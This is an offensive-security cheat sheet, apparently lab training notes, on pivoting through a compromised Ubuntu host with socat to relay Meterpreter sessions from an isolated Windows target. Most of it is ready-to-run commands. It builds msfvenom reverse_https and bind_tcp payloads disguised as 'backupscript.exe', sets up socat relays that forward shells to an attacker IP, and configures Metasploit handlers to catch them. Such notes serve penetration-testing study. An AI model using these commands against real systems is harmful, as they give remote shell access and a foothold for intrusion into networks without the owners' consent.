# Socat Redirection
**Concept:** You have compromised a **Pivot Host** (Ubuntu) that sits between your Attacker machine and a **Target Windows Host**. The Target cannot route traffic directly to you, so you use Socat on the Pivot to act as a traffic relay.
## 1. Reverse Shell Redirection (Internal -> External)
**Scenario:** The Target Windows host (`172.16.5.19`) has no internet access. It cannot connect back to your Attacker IP (`10.10.14.18`). **Solution:**
1. Target connects to Pivot (`172.16.5.129`).
2. Socat on Pivot forwards that traffic to Attacker (`10.10.14.18`).
### Step 1: Start Socat Relay (On Pivot Host)
We tell Socat to listen on port **8080** and forward anything it receives to the Attacker on port **80**.
- `TCP4-LISTEN:8080`: Listen on port 8080.
- `fork`: Spawns a child process for every connection (critical for stability).
- `TCP4:10.10.14.18:80`: Forward to Attacker IP on port 80.
```shell
# Run on Pivot (Ubuntu)
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &
```
### Step 2: Create Payload (Targeting the Pivot)
The payload must point to the **Pivot's Internal IP** (`172.16.5.129`), _not_ the Attacker.
```shell
# Run on Attacker
# LHOST: Pivot's Internal IP
# LPORT: The port Socat is listening on (8080)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```
### Step 3: Catch the Shell (On Attacker)
The handler listens on the final destination port (**80**).
```shell
# Run on Attacker
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```
## 2. Bind Shell Redirection (External -> Internal)
**Scenario:** The Target Windows host allows inbound connections on specific ports, but has no outbound route. 
**Solution:**
1. Target opens a Bind port (`8443`).
2. Socat on Pivot listens on port `8080` and forwards to Target:`8443`.
3. Attacker connects to Pivot:`8080`.
### Step 1: Create Payload (Targeting Itself)
The bind payload simply opens a port on the victim.
```shell
# Run on Attacker
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
### Step 2: Start Socat Relay (On Pivot Host)
We tell Socat to listen on **8080** and forward to the Target's bind port **8443**.
```shell
# Run on Pivot (Ubuntu)
# Forward traffic: Pivot:8080 -> Target(172.16.5.19):8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 &
```
### Step 3: Connect (From Attacker)
The handler must connect to the **Pivot's Public IP** (`10.129.202.64`), where Socat is listening.
```shell
# Run on Attacker
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```